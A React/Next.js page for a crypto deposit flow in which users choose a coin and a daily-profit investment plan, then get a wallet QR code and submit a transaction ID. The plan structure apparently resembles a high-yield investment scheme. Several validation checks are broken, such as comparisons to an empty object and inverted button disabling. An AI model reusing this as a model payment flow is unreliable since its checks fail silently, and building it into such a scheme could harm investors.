"use client"

import QRCode from "qrcode";
import { ErrorMessage, Field, Form, Formik } from 'formik';
import Image from 'next/image'
import React, { useState, useEffect } from 'react'
import * as Yup from "yup";
import { useRouter } from 'next/navigation';
import axios from 'axios';
import { CgArrowLeft } from 'react-icons/cg';
import { DesktopSideBar } from './../components/DesktopSideBar';
import { Header } from './../components/Header';
import LoadingScreen from '@/app/loading';
import { useAuth } from '@/app/context/AuthContext';
import { BiCopy } from "react-icons/bi";
import { GrTransaction } from "react-icons/gr";
import { LuArrowDownToLine } from "react-icons/lu";
import { FaInfo } from "react-icons/fa6";
import { GoHome } from "react-icons/go";

const plans = [
    {
        plan_name: process.env.NEXT_PUBLIC_PLAN_A_NAME,
        plan_profit: process.env.NEXT_PUBLIC_PLAN_A_DAILY_PROFIT,
        plan_min: process.env.NEXT_PUBLIC_PLAN_A_MIN_AMOUNT,
        plan_max: process.env.NEXT_PUBLIC_PLAN_A_MAX_AMOUNT,
        plan_duration: process.env.NEXT_PUBLIC_PLAN_A_DURATION_HRS,
        plan_bonus: process.env.NEXT_PUBLIC_PLAN_A_REFERRAL_BONUS,

    },
    {
        plan_name: process.env.NEXT_PUBLIC_PLAN_B_NAME,
        plan_profit: process.env.NEXT_PUBLIC_PLAN_B_DAILY_PROFIT,
        plan_min: process.env.NEXT_PUBLIC_PLAN_B_MIN_AMOUNT,
        plan_max: process.env.NEXT_PUBLIC_PLAN_B_MAX_AMOUNT,
        plan_duration: process.env.NEXT_PUBLIC_PLAN_B_DURATION_HRS,
        plan_bonus: process.env.NEXT_PUBLIC_PLAN_B_REFERRAL_BONUS,

    },
    {
        plan_name: process.env.NEXT_PUBLIC_PLAN_C_NAME,
        plan_profit: process.env.NEXT_PUBLIC_PLAN_C_DAILY_PROFIT,
        plan_min: process.env.NEXT_PUBLIC_PLAN_C_MIN_AMOUNT,
        plan_max: process.env.NEXT_PUBLIC_PLAN_C_MAX_AMOUNT,
        plan_duration: process.env.NEXT_PUBLIC_PLAN_C_DURATION_HRS,
        plan_bonus: process.env.NEXT_PUBLIC_PLAN_C_REFERRAL_BONUS,

    },
    {
        plan_name: process.env.NEXT_PUBLIC_PLAN_D_NAME,
        plan_profit: process.env.NEXT_PUBLIC_PLAN_D_DAILY_PROFIT,
        plan_min: process.env.NEXT_PUBLIC_PLAN_D_MIN_AMOUNT,
        plan_max: process.env.NEXT_PUBLIC_PLAN_D_MAX_AMOUNT,
        plan_duration: process.env.NEXT_PUBLIC_PLAN_D_DURATION_HRS,
        plan_bonus: process.env.NEXT_PUBLIC_PLAN_D_REFERRAL_BONUS,

    },
    {
        plan_name: process.env.NEXT_PUBLIC_PLAN_E_NAME,
        plan_profit: process.env.NEXT_PUBLIC_PLAN_E_DAILY_PROFIT,
        plan_min: process.env.NEXT_PUBLIC_PLAN_E_MIN_AMOUNT,
        plan_max: process.env.NEXT_PUBLIC_PLAN_E_MAX_AMOUNT,
        plan_duration: process.env.NEXT_PUBLIC_PLAN_E_DURATION_HRS,
        plan_bonus: process.env.NEXT_PUBLIC_PLAN_E_REFERRAL_BONUS,

    },
    {
        plan_name: process.env.NEXT_PUBLIC_PLAN_F_NAME,
        plan_profit: process.env.NEXT_PUBLIC_PLAN_F_DAILY_PROFIT,
        plan_min: process.env.NEXT_PUBLIC_PLAN_F_MIN_AMOUNT,
        plan_max: process.env.NEXT_PUBLIC_PLAN_F_MAX_AMOUNT,
        plan_duration: process.env.NEXT_PUBLIC_PLAN_F_DURATION_HRS,
        plan_bonus: process.env.NEXT_PUBLIC_PLAN_F_REFERRAL_BONUS,

    }
]

export default function Page() {

  const router = useRouter();
  const [step, setStep] = useState(1);
  const [coin, setCoin] = useState("");
  const { user } = useAuth();
  const [amount, setAmount] = useState(100);
  const [isError, setIsError] = useState(false);
  const [loading, setLoading] = useState(false);
  const [selectedPlan, setSelectedPlan] = useState(null);
  const [errorMessage, setErrorMessage] = useState("");
  const [qr, setQr] = useState("");

    const wallets = {
        BNB: process.env.NEXT_PUBLIC_BINANCE_BNB,
        BTC: process.env.NEXT_PUBLIC_BITCOIN_BTC,
        USDT: process.env.NEXT_PUBLIC_TETHER_USDT,
        XRP: process.env.NEXT_PUBLIC_RIPPLE_XRP,
        ETH: process.env.NEXT_PUBLIC_ETHEREUM_ETH,
        SOL: process.env.NEXT_PUBLIC_SOLANA_ETH,
    }   

    const walletAddress = wallets[coin];
  
  
    useEffect(() => {
    if (!walletAddress) return;

    QRCode.toDataURL(walletAddress)
      .then(setQr)
      .catch(console.error);
  }, [walletAddress]);
  
    // ✅ Copy Address
    const copyAddress = async () => {
        if (!walletAddress) return;
        // Get the text field
        let copyText = document.getElementById("address");

        // Select the text field
        copyText.select();
        copyText.setSelectionRange(0, 99999); // For mobile devices

        // Copy the text inside the text field
        try {
            await navigator.clipboard.writeText(walletAddress);
            alert("Wallet address copied ✅");
            return;
        } catch (err) {
            alert("Copy failed!");
            return;
        }
    }
  
    // ✅ Download QR
    const downloadQR = () => {
      const link = document.createElement("a");
      link.href = qr;
      link.download = "wallet-qr.png";
      link.click();
    };


  const handleCoin = (coin) => {
    setCoin(coin);
    setStep(2);
  }

  let initialValueAmount = {
    amount: 100,
  }

  let initialValueTransactionID = {
    transactionID: "",
  }

  const validationSchemaTransactionID = Yup.object({
    transactionID: Yup.string()
      .required("Please enter you transaction ID."),
  });

  const validationSchemaAmount = Yup.object({
    amount: Yup.number()
      .required("Please enter the amount you want to invest."),
  });


  const validateDeposit = (values, onSubmitProps) => {
        setIsError(false)
      //setLoading(true);
        onSubmitProps.setSubmitting(false);
        if (selectedPlan == {} || values.amount < selectedPlan.plan_min) {
            setErrorMessage("Amount must not be less than selected plan minimum amount!");
            setIsError(true)
            setLoading(false);
        } else if (selectedPlan == {} || values.amount > selectedPlan.plan_max) {
            setErrorMessage("Amount must not be above selected plan maximum amount!");
            setIsError(true)
            setLoading(false);
        } else if (selectedPlan.plan_max === "UNLIMITED" &&  values.amount >= selectedPlan.plan_max) {
            setErrorMessage("Amount must not be above selected plan maximum amount!");
            setIsError(true)
            setLoading(false);
        }
         else {
            setIsError(false)
            setAmount(values.amount)
            setStep(3);
            setLoading(false);
        }
  }

  async function processPayment (values, onSubmitProps) {
        setIsError(false)
        setLoading(true);

        try {

      const res = await axios.post(
        `/api/auth/users/deposit/depo?id=3848339`,
        {
          transaction_type: "deposit",
          transactionID: values.transactionID,
          currency: coin,
          plan: selectedPlan,
          amount: amount,
        },
        {
          withCredentials: true,
          headers: { "Content-Type": "application/json" }  
        }
      );

      if (res.status === 201) {
        setIsError(false);
        setStep(4);
      } else {
        setErrorMessage(err.message);
        setIsError(true);
        setLoading(false);
      }
      
    } catch(err) {
      setErrorMessage(err.message);
      setIsError(true);
      setLoading(false);
    }
  }

  return (
    <div className="bg-white w-full h-full dark:bg-isoDark dark:text-white text-black min-h-screen relative font-[family-name:var(--font-geist-sans)]">
     {loading === true && (<LoadingScreen tab={'signIn'} />)}
     <div className='hidden md:block w-full'>
        <Header />
     </div>

       <div className='w-full h-full min-h-screen md:pt-20 flex items-start'>
     
          <DesktopSideBar tab={"deposit"} />

          <div className='w-full h-full md:py-16 relative px-4 flex flex-col md:justify-center md:items-center md:px-40'>
                <div className='w-full flex flex-col space-y-5 md:space-y-16 '>

                <div className='flex items-center justify-center py-4 md:py-0 text-black dark:text-white relative'>
                    {
                        step === 1 ? (
                            <a
                                className='flex absolute left-0'
                                href='/dashboard'
                            >
                                <GoHome className='text-2xl' />
                            </a>
                        ) : (
                            <div
                                className='flex absolute left-0'
                                onClick={() => setStep(1)}
                            >
                                <CgArrowLeft className='text-2xl' />
                            </div>
                        )
                    }

                    <h1 className='text-lg font-medium md:text-3xl md:font-semibold'>

                    {step === 1 ? (
                        <span>Choose Currency</span>
                    ) : step === 2 ? (
                        <span>Choose Plan</span>
                    ) : (
                        <span>Deposit {" "}{coin}</span>
                    )}
                
                    </h1>
                </div>


                {step === 1 && (
                    <div className="w-full flex flex-col">
                        <div className="w-full">
                            <h4
                            className={`dark:text-white text-black font-medium py-2 px-4`}
                            >
                            Which coin are you investing? 
                            </h4>
                        </div>

                        <div className="w-full flex flex-col space-y-4 py-3 transition-500 overflow-hidden">
                                <div className='flex w-full justify-between items-center hover:bg-[#f4f4f7] dark:hover:bg-isoDark2 py-3 rounded-2xl cursor-pointer'
                                onClick={() => handleCoin("BTC")}>
                                    <div className='flex items-center px-4 space-x-2'>
                                        <Image
                                            src="/icons/bitcoin.webp"
                                            alt="Astiox_logo"
                                            className="w-7"
                                            width={50}
                                            height={0}
                                        />
                                        <div className='space-y-1'>
                                            <h2 className='font-medium text-base dark:text-white'>Bitcoin</h2>
                                            <span className='text-xs text-neutral-400'>BTC</span>
                                        </div>
                                    </div>

                                    
                                </div>

                                <div className='flex w-full justify-between items-center hover:bg-[#f4f4f7] dark:hover:bg-isoDark2 py-3 rounded-2xl cursor-pointer'
                                onClick={() => handleCoin("BNB")}>
                                    <div className='flex items-center space-x-2 px-4'>
                                        <Image
                                            src="/icons/bnb-icon2_2x.webp"
                                            alt="Astiox_logo"
                                            className="w-7"
                                            width={50}
                                            height={0}
                                        />
                                        <div className='space-y-1'>
                                            <h2 className='font-medium text-base dark:text-white'>BNB</h2>
                                            <span className='text-xs text-neutral-400'>BNB</span>
                                        </div>
                                    </div>

                                    
                                </div>

                                <div className='flex w-full justify-between items-center hover:bg-[#f4f4f7] dark:hover:bg-isoDark2 py-3 rounded-2xl cursor-pointer'
                                onClick={() => handleCoin("USDT")}>
                                    <div className='flex items-center space-x-2 px-4'>
                                        <Image
                                            src="/icons/Tether.webp"
                                            alt="Astiox_logo"
                                            className="w-7"
                                            width={50}
                                            height={0}
                                        />
                                        <div className='space-y-1'>
                                            <h2 className='font-medium text-base dark:text-white'>USDT</h2>
                                            <span className='text-xs text-neutral-400'>TetherUS</span>
                                        </div>
                                    </div>

                                    
                                </div>

                                <div className='flex w-full justify-between items-center hover:bg-[#f4f4f7] dark:hover:bg-isoDark2 py-3 rounded-2xl cursor-pointer'
                                onClick={() => handleCoin("ETH")}>
                                    <div className='flex items-center space-x-2 px-4'>
                                        <Image
                                            src="/icons/ethereum.webp"
                                            alt="Astiox_logo"
                                            className="w-7"
                                            width={50}
                                            height={0}
                                        />
                                        <div className='space-y-1'>
                                            <h2 className='font-medium text-base dark:text-white'>ETH</h2>
                                            <span className='text-xs text-neutral-400'>Ethereum</span>
                                        </div>
                                    </div>

                                    
                                </div>

                                <div className='flex w-full justify-between items-center hover:bg-[#f4f4f7] dark:hover:bg-isoDark2 py-3 rounded-2xl cursor-pointer'
                                onClick={() => handleCoin("XRP")}>
                                    <div className='flex items-center space-x-2 px-4'>
                                        <Image
                                            src="/icons/xrp-symbol-white-128.webp"
                                            alt="Astiox_logo"
                                            className="w-7"
                                            width={50}
                                            height={0}
                                        />
                                        <div className='space-y-1'>
                                            <h2 className='font-medium text-base dark:text-white'>XRP</h2>
                                            <span className='text-xs text-neutral-400'>XRP</span>
                                        </div>
                                    </div>

                                    
                                </div>

                                <div className='flex w-full justify-between items-center hover:bg-[#f4f4f7] dark:hover:bg-isoDark2 py-3 rounded-2xl cursor-pointer'
                                onClick={() => handleCoin("SOL")}>
                                    <div className='flex items-center space-x-2 px-4'>
                                        <Image
                                            src="/icons/solana.webp"
                                            alt="Astiox_logo"
                                            className="w-7"
                                            width={50}
                                            height={0}
                                        />
                                        <div className='space-y-1'>
                                            <h2 className='font-medium text-base dark:text-white'>SOL</h2>
                                            <span className='text-xs text-neutral-400'>Solana</span>
                                        </div>
                                    </div>

                                    
                                </div>
                        </div>
                    </div>
                )}

                {step === 3 && (
                    <div className="flex flex-col dark:space-y-5 items-center w-full pb-40 md:px-40 justify-center">

                        <div className='w-full rounded-3xl dark:bg-isoDark2 dark:text-white dark:border dark:border-neutral-600 bg-[#f4f4f5] text-black p-3 flex space-x-3 items-center'>
                            <div className='bg-isoColor1 dark:bg-isoColor2 dark:text-black rounded-full p-1 text-blue-100'><FaInfo className={`h-4 w-4`} /></div>
                            <p className='text-xs'>Before sending, double-check <span className="text-isoColor1 dark:text-isoColor2">the network</span>, <span className="text-isoColor1 dark:text-isoColor2">deposit address</span>, and <span className="text-isoColor1 dark:text-isoColor2">coin</span>, and send only <span className="text-isoColor1 dark:text-isoColor2">the exact amount</span>.</p>
                        </div>

                        <div className='w-full flex flex-col md:px-5 relative md:w-[450px] md:h-[650px] md:rounded-3xl md:shadow-lg'>
                            
                            <div className="">
                                <div className="flex justify-center items-center">

                                    {/* QR Code */}
                                    <div className="flex justify-center items-center">
                                    {qr && (
                                        <div className="p-3 bg-white relative rounded-2xl">
                                        <img
                                            src={qr}
                                            onClick={downloadQR}
                                            alt="Wallet QR"
                                            className="w-44 h-44"
                                        />

                                        <div className='absolute bg-white p-1 top-20 right-20 '>
                                                {coin === "BTC" ? (
                                                <Image
                                                    src="/icons/bitcoin.webp"
                                                    alt="Astiox_logo"
                                                    className="w-7"
                                                    width={50}
                                                    height={0}
                                                />)
                                                : coin === "ETH" ? (
                                                    <Image
                                                    src="/icons/ethereum.webp"
                                                    alt="Astiox_logo"
                                                    className="w-7"
                                                    width={50}
                                                    height={0}
                                                />
                                                )
                                                : coin === "USDT" ? (
                                                    <Image
                                                    src="/icons/Tether.webp"
                                                    alt="Astiox_logo"
                                                    className="w-7"
                                                    width={50}
                                                    height={0}
                                                    />
                                                )
                                                : coin === "BNB" ? (
                                                    <Image
                                                    src="/icons/bnb-icon2_2x.webp"
                                                    alt="Astiox_logo"
                                                    className="w-7"
                                                    width={50}
                                                    height={0}
                                                    />
                                                )
                                                : coin === "XRP" ? (
                                                    <Image
                                                    src="/icons/xrp-symbol-white-128.webp"
                                                    alt="Astiox_logo"
                                                    className="w-7"
                                                    width={50}
                                                    height={0}
                                                    />
                                                    )
                                                : coin === "SOL" ? (
                                                    <Image
                                                    src="/icons/solana.webp"
                                                    alt="Astiox_logo"
                                                    className="w-7"
                                                    width={50}
                                                    height={0}
                                                    />
                                                    )
                                                : (
                                                    <Image
                                                    src="/icons/Tether.webp"
                                                    alt="Astiox_logo"
                                                    className="w-7"
                                                    width={50}
                                                    height={0}
                                                    />
                                                    )}
                                        </div>

                                        </div>
                                    )}
                                    </div>

                                </div>
                            </div>

                            <div className="flex w-full justify-between relative items-center">
                                <div className="space-y-0 flex flex-col flex-wrap py-4 border-b dark:border-neutral-600 border-gray-100">
                                    <p className="text-sm text-neutral-500">Network</p>

                                    <h1 className='text-lg font-semibold'>
                                                    {coin === "BTC" ? "BTC"
                                                    : coin === "ETH" ? "ETH"
                                                    : coin === "USDT" ? "BSC"
                                                    : coin === "BNB" ? "BSC"
                                                    : coin === "XRP" ? "XRP"
                                                    : coin === "SOL" ? "SOL"
                                                    : "TRX"}
                                    </h1>
                                    <span className="text-xs text-neutral-400">
                                                    {coin === "BTC" ? "Bitcoin (BTC)"
                                                    : coin === "ETH" ? "Ethereum (ETH)"
                                                    : coin === "USDT" ? "Tether USD (BEP20)"
                                                    : coin === "BNB" ? "BNB Smart Chain (BNB)"
                                                    : coin === "XRP" ? "BNB pegged XRP Token (BEP20)"
                                                    : coin === "SOL" ? "Solana (SOL)"
                                                    : ""}
                                    </span>
                                </div>

                                <div className="flex absolute right-0 pl-6">
                                    <span onClick={() => setStep(1)} className="rounded-xl dark:bg-isoDark2 dark:text-white bg-[#f4f4f5] text-black p-3 ">
                                        <GrTransaction className='w-5 h-5' />
                                    </span>
                                </div>
                            </div>

                            <div className="flex w-full justify-between relative items-center">
                                <div className="space-y-0 flex flex-col flex-wrap py-4 border-b dark:border-neutral-600 border-gray-100">
                                    <p className="text-sm text-neutral-500">Amount</p>
                                    <h1 className="text-lg font-semibold">${amount} {coin}</h1>
                                </div>

                                <div className="flex absolute right-0 pl-6">
                                    <span onClick={() => setStep(2)} className="rounded-xl dark:bg-isoDark2 dark:text-white bg-[#f4f4f5] text-black p-3 ">
                                        <GrTransaction className='w-5 h-5' />
                                    </span>
                                </div>
                            </div>

                            <div className="flex w-full justify-between relative items-center">
                                <div className="space-y-0 flex flex-col flex-wrap py-6 border-b dark:border-neutral-600 border-gray-100">
                                    <p className="text-sm text-neutral-500">Deposit Address</p>
                                    <input
                                    id="address"
                                    className="text-lg py-1 dark:bg-isoDark2 dark:text-white font-normal text-black w-full flex flex-wrap hover:outline-none px-0 border-0 outline-none"
                                    type="text"
                                    value={walletAddress}
                                    readOnly
                                    />
                                </div>

                                <div className="flex absolute right-0 pl-6">
                                    <span onClick={copyAddress} className="rounded-xl dark:bg-isoDark2 dark:text-white bg-[#f4f4f5] text-black p-3 ">
                                        <BiCopy className='w-5 h-5' />
                                    </span>
                                </div>
                            </div>

                            <div className="flex flex-col space-y-4 py-4 text-xs">
                                <p className="flex justify-between items-center">
                                    <span className="text-neutral-400">Minimum deposit</span>
                                    <span className="">{'> '}{selectedPlan.plan_min}.00 USD</span>
                                </p>

                                <p className="flex justify-between items-center">
                                    <span className="text-neutral-400">Credited (Trading enabled)</span>
                                    <span className="">1 Confirmation(s)</span>
                                </p>

                                <p className="flex justify-between items-center">
                                    <span className="text-neutral-400">Unlocked (Withdrawal enabled)</span>
                                    <span className="">1 Confirmation(s)</span>
                                </p>
                            </div>

                            <div className='fixed md:absolute bottom-0 bg-white dark:bg-isoDark dark:text-white py-4 left-4 right-4'>
                                <Formik
                                            initialValues={initialValueTransactionID}
                                            validationSchema={validationSchemaTransactionID}
                                            onSubmit={processPayment}
                                        >
                                            {({ errors, touched, values }) => (
                                            <Form className="w-full flex md:px-8 flex-col space-y-4">
                                                <div>
                                                <label
                                                    htmlFor="transactionID"
                                                    className="flex space-x-2 items-center text-sm pb-1"
                                                >Transaction ID:</label>
                                                <Field name="transactionID">
                                                    {(props) => {
                                                    const { field, form, meta } = props;
                                                    return (
                                                        <input
                                                        placeholder=""
                                                        className={`form__input dark:md:bg-isoDark dark:focus:border-isoColor2 dark:bg-isoDark2 dark:border-neutral-600 dark:text-neutral-500 border-neutral-200 border text-neutral-400 font-medium rounded-full w-full p-3 text-md focus:outline-none focus:border-isoColor1 focus:text-black`}
                                                        type="text"
                                                        id="transactionID"
                                                        name="transactionID"
                                                        {...field}
                                                        />
                                                    );
                                                    }}
                                                </Field>
                                                <ErrorMessage name="transactionID">
                                                    {(errMsg) => (
                                                    <span className="text-red-500 text-xs">{errMsg}</span>
                                                    )}
                                                </ErrorMessage>
                                                </div>
                                                {isError === true && (<p className='text-red-500 text-xs'>{errorMessage}</p>)}

                                                <button
                                                type="submit"
                                                className="w-full py-4 dark:bg-isoColor2 dark:text-black rounded-full bg-isoColor1 text-md hover:bg-isoColor2 hover:text-black text-white"
                                                disabled={Formik.isValid || Formik.isSubmitting}
                                                >
                                                {loading ? "Processing..." : "Save and Process Payment"}
                                                </button>
                                            </Form>
                                            )}
                                </Formik>
                            </div>

                        </div>

                    </div>
                )}

                {step === 2 && (
                    <div className='w-full h-full flex text-black dark:text-white relative flex-col'>
                    
                        <div className="grid grid-cols-1 pb-5 md:grid-cols-2 gap-y-4 md:gap-8">
                            
                           {plans.map((plan) => (
                                <div key={plan.plan_name} onClick={() => setSelectedPlan(plan)} className={`flex cursor-pointer transition-all duration-500 border border-neutral-300 dark:border-neutral-600 rounded-2xl py-4 px-2 w-full flex-col space-y-3 ${
                                    selectedPlan === plan
                                        ? 'bg-[#000] dark:bg-isoColor2 dark:text-black border-black'
                                        : 'dark:bg-isoDark2 dark:text-white'
                                    }`}>
                                    <div className={`flex items-center space-x-1 ${selectedPlan === plan
                                        ? 'text-white dark:text-black'
                                        : 'text-black dark:text-white'
                                    }`}>
                                        <h1 className='flex font-medium text-2xl'>%{plan.plan_profit}.00</h1>
                                        <span>{plan.plan_name}</span>
                                    </div>
                                    <div className={`text-xs space-y-1 text-neutral-500 ${
                                        selectedPlan === plan
                                        ? 'dark:text-black'
                                        : ''
                                        }`}>
                                        <p>Min. deposit: ${plan.plan_min}</p>
                                        <p>Max. deposit: ${plan.plan_max}</p>
                                        <p>Est. earning duration: {plan.plan_duration} hrs</p>
                                    </div>
                                </div>
                             ))}

                        </div>

                        <div className='sticky bottom-0 bg-white dark:bg-isoDark dark:text-white py-5 left-4 right-4'>
                            <Formik
                                        initialValues={initialValueAmount}
                                        validationSchema={validationSchemaAmount}
                                        onSubmit={validateDeposit}
                                      >
                                        {({ errors, touched, values }) => (
                                          <Form className="w-full flex md:px-8 flex-col space-y-4">
                                            <div>
                                              <label
                                                htmlFor="amount"
                                                className="flex space-x-2 items-center text-sm pb-1"
                                              >Investment Amount:</label>
                                              <Field name="amount">
                                                {(props) => {
                                                  const { field, form, meta } = props;
                                                  return (
                                                    <input
                                                      placeholder="0.00"
                                                      className={`form__input dark:md:bg-isoDark dark:focus:border-isoColor2 dark:bg-isoDark2 dark:border-neutral-600 dark:text-neutral-500 border-neutral-200 border text-neutral-400 font-medium rounded-full w-full p-3 text-md focus:outline-none focus:border-isoColor1 focus:text-black`}
                                                      type="number"
                                                      id="amount"
                                                      name="amount"
                                                      {...field}
                                                    />
                                                  );
                                                }}
                                              </Field>
                                              <ErrorMessage name="amount">
                                                {(errMsg) => (
                                                  <span className="text-red-500 text-xs">{errMsg}</span>
                                                )}
                                              </ErrorMessage>
                                            </div>
                                            {isError === true && (<p className='text-red-500 text-xs'>{errorMessage}</p>)}
                        
                                            <button
                                              type="submit"
                                              className="w-full py-4 dark:bg-isoColor2 dark:text-black rounded-full bg-isoColor1 text-md hover:bg-isoColor2 hover:text-black text-white"
                                              disabled={Formik.isValid || Formik.isSubmitting}
                                            >
                                              {loading ? "Processing..." : "Continue"}
                                            </button>
                                          </Form>
                                        )}
                            </Formik>
                        </div>

                    </div>
                )}

                {step === 4 && (
                                    <div className="w-full h-full p-10 flex fixed top-0 bottom-0 right-0 left-0 container mx-auto justify-center bg-black/30 items-center loading-modal">
                                                <div className="rounded-2xl md:w-96 duration-500 transition-all h-fit w-full  flex flex-col items-center py-5 px-3 dark:bg-isoDark2 bg-white space-y-4">
                                                  <div className='flex justify-center items-center w-full'><LuArrowDownToLine className='w-16 text-isoColor1 dark:text-isoColor2 h-16' /></div>
                                    
                                                  <h1 className='px-6 text-lg font-medium text-center md:font-semibold'>Deposit Request was Successful!</h1>
                                    
                                                  <p className='text-xs text-center'>
                                                    The Deposit request you made has been successful sent. {process.env.NEXT_PUBLIC_COMPANY_NAME} is processing your transaction and you'll be notified went the verification is completed. Thank you.
                                                  </p>
                                
                                                  <a
                                                    href="/dashboard"
                                                    className="w-full py-3 text-center dark:bg-isoColor2 dark:text-black rounded-xl bg-isoColor1 text-md hover:bg-isoColor2 hover:text-black text-white"
                                                  >
                                                          OK
                                                  </a>
                                                </div>
                                    </div>
                )}

                </div>

          </div>

        </div>
    </div>
  )
}
